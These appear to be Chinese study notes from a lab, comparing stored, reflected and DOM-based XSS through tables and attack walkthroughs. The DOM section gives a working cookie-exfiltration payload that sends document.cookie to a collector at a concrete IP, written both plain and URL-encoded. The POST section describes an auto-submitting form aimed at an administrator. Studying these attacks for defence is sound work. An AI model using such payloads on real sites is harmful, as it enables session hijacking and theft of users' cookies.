# 三种 XSS 类型学习笔记
## 一、快速对比

| 维度 | 存储型 | 反射型 GET | 反射型 POST | DOM 型 |
|---|---|---|---|---|
| payload 存哪 | 数据库 | URL 参数 | 请求体 | URL 的 # 后 |
| 服务器参与渲染 | 是 | 是 | 是 | 不参与 |
| 服务器日志可见 | 有 | 完整记录 | 只有方法+路径 | 完全没有 |
| 响应 HTML 含 payload | 有 | 有 | 有 | 没有 |
| 需要受害者做什么 | 什么都不做 | 点链接 | 提交表单 | 点链接 |
| 持续性 | 永久 | 一次性 | 一次性 | 一次性 |
| 影响范围 | 所有访客 | 点链接的人 | 提交表单的人 | 点链接的人 |
| 修复位置 | 服务端 | 服务端 | 服务端 | 前端 JS |
| 危害等级 | 高 | 中 | 中 | 中高 |

一句话记住：

- 存储型：注入一次，永久生效，所有访客中招
- 反射型：发个链接，谁点谁中招
- DOM 型：payload 只在浏览器里跑，服务器完全不知情

## 二 存储型 XSS

### 原理：payload 存进服务器，永久生效。

### 攻击流程
① 攻击者在「个性签名」里填入 payload

② payload 存进数据库 users.bio（个性签名） 字段

③ 管理员打开 /admin/users.php

④ 服务端把 bio 原样输出到 HTML

⑤ 浏览器执行 payload

⑥ cookie 被发送到攻击者服务器

## 三 反射型 XSS
|  | get型 | post型|
|---|---|---|
| payload 在哪 | URL 参数 | 请求体 |
| 怎么投递 | 发链接 | 需要攻击页自动提交表单 |
| 受害者看到的URL | search.php?q=%3Cscript%3E... | mail.php（干净） |
| 服务器日志	| 记录完整 payload | 只有 POST /mail.php |
| 隐蔽性 | 差 | 好 |

### post型攻击流程

①确认注入点
```
先手动测试一下：

登录论坛（普通用户）
访问 /mail.php
收件人填 <script>alert(1)</script>
提交
弹窗 → 漏洞存在。
```

②构造恶意payload

③制作攻击页（POST 的参数不在 URL 里，没法直接发链接，必须做一个页面自动提交表单。）

④把攻击页发给受害者
```
管理员打开攻击页 → 0.8 秒后表单自动提交 → 跳到 /mail.php → payload 执行。
```
⑤收数据
```
注意：管理员需要同时登录前台用户和后台管理员，mail.php 才会放行。
```

## 四 DOM型 XSS

### 原理：payload 全程不离开浏览器，服务器完全不知情。
```
URL 的 # 后面 → location.hash → innerHTML → 执行
        ↑ 浏览器不发送这部分给服务器        ↑ 浏览器 JS 执行
```

###  源码特征
```
var tab = decodeURIComponent(location.hash.slice(1));   // source（源）
box.innerHTML = '<h3>当前栏目：' + tab + '</h3>';         // sink（汇）
source → sink 之间没有过滤，就是漏洞。
```
|术语|	含义|	例子|
|---|---|---|
|source（源）|	数据从哪来|	location.hash、location.search、document.referrer|
|sink（汇）|	危险函数在哪|	innerHTML、eval、document.write|

### 攻击流程
①构造payload
```
<img src=x onerror="new Image().src='http://信标地址/collect.php?c='+document.cookie">
```
②URL编码
```
http://47.114.104.254/home.php#%3Cimg%20src%3Dx%20onerror%3D%22new%20Image().src%3D'http%3A%2F%2F47.114.104.254%2Fcollect.php%3Fc%3D'%2Bdocument.cookie%22%3E
```
③发给受害者（管理员点开链接后，payload 在浏览器里执行）

④在信标收到数据
### 为什么难排查
|原因|	说明|
|---|---|
|服务器日志没有 payload	|# 不发往服务器|
|响应 HTML 没有 payload|	JS 自己拼的
|WAF 拦不住	|根本不经过服务器|
|扫描器容易漏|	没有回显|
## 五 攻击流程对照
|步骤	|存储型|	反射型GET|	反射型 POST|	DOM 型|
|---|---|---|---|---|
|1|	注入到用户资料|	构造恶意 URL|	构造恶意 URL + 攻击页|	构造恶意 URL|
|2	|存进数据库|	发给受害者	|发给受害者	|发给受害者|
|3|	管理员打开后台|	受害者点击	|表单自动提交|	受害者点击|
|4|	服务端渲染时执行|	服务端渲染时执行|	服务端渲染时执行|	浏览器 JS 执行|
|5|	cookie 外传|	cookie 外传|	cookie 外传	|cookie 外传|
|6|	会话劫持	|会话劫持|	会话劫持|	会话劫持|
